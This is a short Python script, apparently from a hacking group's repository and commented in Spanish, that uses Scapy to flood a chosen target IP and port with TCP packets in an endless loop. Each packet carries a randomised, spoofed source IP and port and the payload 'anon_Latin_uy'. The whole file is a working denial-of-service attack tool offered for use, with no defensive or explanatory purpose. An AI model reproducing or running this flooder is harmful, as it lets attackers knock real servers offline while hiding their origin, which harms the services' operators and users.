#!/usr/bin/env python3
#_*_ coding: utf8 _*_
#Made_in_Cone_Crew Repo https://www.github.com/ConeCrew/
from scapy.all import RandIP 
from scapy.all import RandShort
from scapy.all import IP
from scapy.all import TCP
from scapy.all import Raw
from scapy.all import send  
import argparse
import sys

parse = argparse.ArgumentParser()
parse.add_argument("-t", "--target",help="Direccion del objetivo")
parse.add_argument("-p", "--port", help= "puerto a atacar")
parse = parse.parse_args()

target = parse.target
message = "anon_Latin_uy"

def main ():
    try:
       count = 0
       while True:
           srcip = RandIP()
           sport = RandShort()
           dport = parse.port  # o RandShort() para atacar a todos los puertos del servidor 80=http 21=ftp 443=https

           IP_layer = IP(src=srcip, dst=parse.target)
           TCP_layer = TCP(sport=sport, dport=dport)
           Raw_layer = Raw(load=message)
           final_packet = IP_layer/TCP_layer/Raw_layer
           send(final_packet, verbose=False)

           count = count + 1
           print("\rN.P: " + str(count) + " IP SRC: " + str(srcip) + "SRC PORT: " + str(sport)),
           sys.stdout.flush()
           
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
   main()
